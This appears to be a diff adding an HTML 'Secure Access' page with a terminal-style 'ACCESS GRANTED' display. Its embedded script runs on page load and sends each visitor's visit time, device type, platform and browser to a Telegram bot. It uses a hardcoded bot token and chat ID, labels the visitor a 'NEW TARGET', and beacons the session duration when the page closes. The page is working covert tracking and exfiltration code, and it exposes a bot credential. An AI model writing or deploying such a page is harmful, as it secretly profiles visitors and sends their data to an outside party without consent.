@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Secure Access</title>
+
+<style>
+body{
+  margin:0;
+  background:#0b0f14;
+  color:#00ff9c;
+  font-family: Consolas, monospace;
+  height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+
+.card{
+  background:#0f1720;
+  padding:40px;
+  border-radius:12px;
+  box-shadow:0 0 25px rgba(0,255,150,0.15);
+  text-align:center;
+  border:1px solid rgba(0,255,150,0.2);
+}
+
+h1{
+  margin-bottom:10px;
+}
+
+.scan{
+  margin-top:15px;
+  font-size:14px;
+  opacity:0.7;
+  animation: blink 1.5s infinite;
+}
+
+@keyframes blink{
+  50%{opacity:0.3;}
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+<h1>ACCESS GRANTED</h1>
+<p>System scanning device...</p>
+<div class="scan">Collecting visitor data...</div>
+</div>
+
+<script>
+
+// وقت الدخول
+const startTime = Date.now();
+
+// بياناتك
+const BOT_TOKEN = "8789081499:AAEgYb8Er_b0cMefh8ACy2hyMMukg8jTyDE";
+const CHAT_ID = "6013622196";
+
+// وقت الزيارة
+const visitTime = new Date().toLocaleString();
+
+// المنصة
+const platform = navigator.platform;
+
+// استخراج معلومات الجهاز
+function getDeviceInfo(){
+const ua = navigator.userAgent;
+
+let device =
+/Android/i.test(ua) ? "Android Phone" :
+/iPhone|iPad/i.test(ua) ? "iPhone" :
+/Windows/i.test(ua) ? "Windows PC" :
+/Mac/i.test(ua) ? "Mac" : "Unknown";
+
+let browser =
+/Chrome/i.test(ua) ? "Chrome" :
+/Firefox/i.test(ua) ? "Firefox" :
+/Safari/i.test(ua) ? "Safari" :
+/Edge/i.test(ua) ? "Edge" : "Unknown";
+
+return {device, browser};
+}
+
+const info = getDeviceInfo();
+
+// إرسال رسالة
+function sendToTelegram(message){
+fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+chat_id:CHAT_ID,
+text:message
+})
+});
+}
+
+// رسالة دخول الزائر
+sendToTelegram(
+`⚡ NEW TARGET CONNECTED
+
+🕒 Time: ${visitTime}
+📱 Device: ${info.device}
+💻 Platform: ${platform}
+🌐 Browser: ${info.browser}
+
+━━━━━━━━━━━━━━
+SYSTEM STATUS: ACTIVE`
+);
+
+// عند خروج الزائر
+window.addEventListener("beforeunload", function(){
+const duration = Math.round((Date.now() - startTime) / 1000);
+
+navigator.sendBeacon(
+`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+new URLSearchParams({
+chat_id: CHAT_ID,
+text:
+`⚠ SESSION CLOSED
+
+⏱ Duration: ${duration} seconds`
+})
+);
+});
+
+</script>
+
+</body>
+</html>
